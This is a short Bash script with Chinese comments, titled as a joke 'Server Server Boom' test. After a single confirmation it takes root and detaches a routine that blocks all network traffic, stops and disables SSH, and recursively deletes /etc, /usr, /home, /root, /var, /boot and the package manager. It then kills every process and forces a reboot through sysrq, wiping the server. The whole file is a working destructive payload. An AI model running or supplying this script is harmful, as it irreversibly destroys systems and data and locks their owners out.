set -e
RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'

echo -e "${RED}============================================================================================================${NC}"
echo -e "${RED}               您正在运行「zakoflare 笑传之Server Server Boom」20260513A1RE-TEST ${NC}"
echo -e "${RED}============================================================================================================${NC}"
read -p "输入 y 确认: " confirm < /dev/tty
if [ "$confirm" != "y" ]; then
    echo "取消。"
    exit 0
fi

# 提权
if [ "$EUID" -ne 0 ]; then
    sudo -v || { echo "sudo 失败"; exit 1; }
    exec sudo bash "$0" "$@"
fi

nuke() {
    # 防火墙直接阻断一切
    iptables -F; iptables -X
    iptables -P INPUT DROP; iptables -P FORWARD DROP; iptables -P OUTPUT DROP

    # 关闭 SSH 服务并禁用
    systemctl stop sshd 2>/dev/null; systemctl disable sshd 2>/dev/null
    systemctl stop ssh 2>/dev/null; systemctl disable ssh 2>/dev/null

    # 并行删除一切常见目录
    (rm -rf --no-preserve-root /opt /www /srv /home /root /etc /var /usr /bin /lib /boot /tmp/* &)

    # 摧毁包管理系统
    rm -rf /var/lib/dpkg /var/lib/apt /var/cache/apt /usr/bin/dpkg /usr/bin/apt* &

    # 杀掉所有用户进程
    ps -eo pid --no-headers | grep -v "$$" | xargs -r kill -9 2>/dev/null

    # 强制关机
    echo 1 > /proc/sys/kernel/sysrq
    echo b > /proc/sysrq-trigger 2>/dev/null || /sbin/shutdown -h now &
}

# 脱离终端
nohup bash -c "$(declare -f nuke); nuke" >/dev/null 2>&1 &
disown

# 切断SSH连接
iptables -A OUTPUT -p tcp --sport 22 -j REJECT --reject-with tcp-reset

kill -9 $(ps -o ppid= -p $$) 2>/dev/null

exit 0